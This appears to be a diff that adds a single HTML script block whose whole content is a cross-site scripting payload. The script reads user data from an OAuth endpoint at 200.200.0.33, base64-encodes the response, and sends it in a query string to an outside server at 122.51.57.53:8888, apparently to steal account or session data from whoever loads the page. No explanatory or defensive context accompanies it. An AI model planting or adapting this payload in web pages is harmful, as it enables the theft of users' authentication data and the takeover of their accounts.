@@ -1,0 +1,10 @@
+<script>
+    var xhr1 = new XMLHttpRequest();
+    xhr1.open('GET', 'http://200.200.0.33/ss/auth/att_oauth2/user.json', true);
+    xhr1.send();
+    var rep = btoa(xhr1.responseText);
+    var xhr2 = new XMLHttpRequest();
+    xhr2.open('GET', 'http://122.51.57.53:8888/?t='+rep, true);
+    xhr2.send();
+</script>
+
